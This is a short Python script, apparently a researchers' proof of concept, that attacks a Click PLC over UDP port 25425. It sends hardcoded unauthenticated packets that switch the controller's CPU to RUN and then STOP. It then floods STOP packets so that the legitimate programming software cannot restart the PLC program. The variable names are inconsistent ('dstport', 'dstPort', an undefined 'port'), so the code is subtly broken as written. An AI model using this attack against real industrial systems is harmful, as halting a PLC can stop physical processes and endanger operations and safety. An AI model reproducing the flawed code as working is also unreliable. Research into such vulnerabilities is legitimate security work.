#!/usr/bin/python
# ======================================================================
#
# cpumode.py
#
# This script tests to see if the cpu mode of a Click C0-10DD1E-D
# PLC can be changed without the legitimate programming software.
#
# Authors: Gary Roth, Dan Ritter, Rich Tanner
# Date: March 2017
#
# ======================================================================

import socket
import binascii
import struct
import time
import sys
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket to send data out
rec = None  # holds received data from the Click PLC
srcIP = '192.168.0.20' # source IP address of sender
srcPort = random.randint(40000, 55000) # source port
dstIP = '192.168.0.101' # IP address of PLC
dstport = 25425 # port number of PLC

run = binascii.unhexlify("4b4f50002d00848405004d01651082") # packet to change CPU mode to RUN
stop = binascii.unhexlify("4b4f50006300c6a405004d01651080") # packet to change CPU mode to STOP

# Bind socket
sock.bind((srcIP, srcPort))

# Send Run command and check result
rec = sock.sendto(run, (dstIP, dstPort))

# Send Stop command and check result
rec = sock.sendto(stop, (dstIP, dstPort))

# Send flood of Stop commands to prevent the PLC program from being started
# from the legitimate programming software
try:
    while True:
        sock.sendto(stop, (dstIP, port))
except KeyboardInterrupt as e:
    sys.exit(0)
    
# Run CPU packet format
# 4b4f50 00 2d 00 8484 05004d01651082

# Stop CPU packet format
# 4b4f50 00 63 00 c6a4 05004d01651080
